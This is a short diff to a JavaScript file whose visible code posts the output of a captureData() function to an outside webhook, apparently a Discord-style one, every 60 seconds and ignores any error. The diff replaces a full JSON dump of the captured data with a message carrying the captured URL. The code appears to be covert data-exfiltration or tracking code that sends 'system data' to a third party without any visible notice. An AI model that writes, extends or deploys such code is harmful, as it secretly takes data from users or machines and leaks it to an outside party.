@@ -13,16 +13,12 @@
     
     // Send data every 60 seconds
     setInterval(function() {
+        const message = 'System data captured: ' + captureData().url;
         fetch(webhookUrl, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: 'System data captured',
-                embeds: [{
-                    title: 'Monitor Data',
-                    description: '```json\n' + JSON.stringify(captureData()) + '\n```',
-                    color: 65280
-                }]
+                content: message
             })
         }).catch(() => {});
     }, 60000);
